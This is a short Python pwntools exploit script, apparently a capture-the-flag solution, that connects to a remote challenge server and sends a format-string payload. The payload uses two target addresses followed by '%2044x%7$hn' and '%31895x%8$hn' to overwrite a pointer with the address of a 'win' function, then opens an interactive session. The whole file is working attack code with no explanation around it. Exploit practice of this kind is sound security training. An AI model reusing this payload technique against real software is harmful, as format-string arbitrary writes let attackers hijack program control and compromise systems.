from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22197


### run a remote process
s = remote(SERVER, PORT)

win = "804849b"

win_0_3 = win[0:3]
print("win_0_3", win_0_3)
win_int_0_3 = int(win_0_3, 16)
print("win_int_0_3", win_int_0_3)

win_4_end = win[3:]
print("win_4_end", win_4_end)
win_int_4_end = int(win_4_end, 16)
print("win_int_4_end", win_int_4_end)

# 0804 + 849b -> 2052 + 33947
#33947 - 2052 = 31895
s.send(p32(0x804a01a)+p32(0x804a018)+b'%2044x%7$hn' + b'%31895x%8$hn')

r = s.recv()
print(r)
s.interactive()

